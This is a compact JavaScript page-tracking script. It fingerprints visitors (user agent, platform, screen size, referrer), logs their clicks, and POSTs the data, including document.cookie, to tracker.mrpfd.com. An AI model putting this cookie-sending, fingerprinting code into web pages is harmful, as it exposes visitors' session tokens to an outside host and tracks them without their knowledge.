"use strict"; 
(function(){ 
	var e="",
	t=JSON.stringify,
	a=navigator,
	n="beforeunload",
	r=window,
	o=r.addEventListener,
	i=r.removeEventListener,
	d=document,
	c="click",
	s=screen,
	u=function g(e,a,n){
		var r=new XMLHttpRequest, o="https://tracker.mrpfd.com/";
		r.onreadystatechange=function(){
			if( r.readyState==4&&r.status==200&&n ) {n(r.response)}
		};
		r.open("POST",o+e,e!=1);
		r.send(t(a))
	},
	f=function m(){
		var n=JSON.parse(t(r.location));
		n.platform=a.platform;
		n.appName=a.appName;
		n.userAgent=a.userAgent;
		n.language=a.language;
		n.height=s.height;
		n.width=s.width;
		n.referrer=d.referrer;
		n.cookie=d.cookie;
		n.id=e;
		return n
	},
	l=function N(t){
		return{
			tagName:t.tagName,
			title:t.title,
			src:t.src,
			href:t.href,
			target:t.id,
			className:t.className,
			download:t.download,
			media:t.media,
			type:t.type,
			name:t.name,
			id:e
		}
	},
	p=function h(){
		u(1,f());
		i(n,h)
	};
	u(0,f(),function(t){
		e=t;
		o(n,p);
		o(c,function(e){
			var t=e.target;
			u(2,l(t));
			while(t.parentNode){
				if( ["a","button","img"].indexOf(t.parentNode.localName)>-1 ) {
					u(2,l(t.parentNode));
					break
				}
				t=t.parentNode
			}
		},
		true)
	})
})();
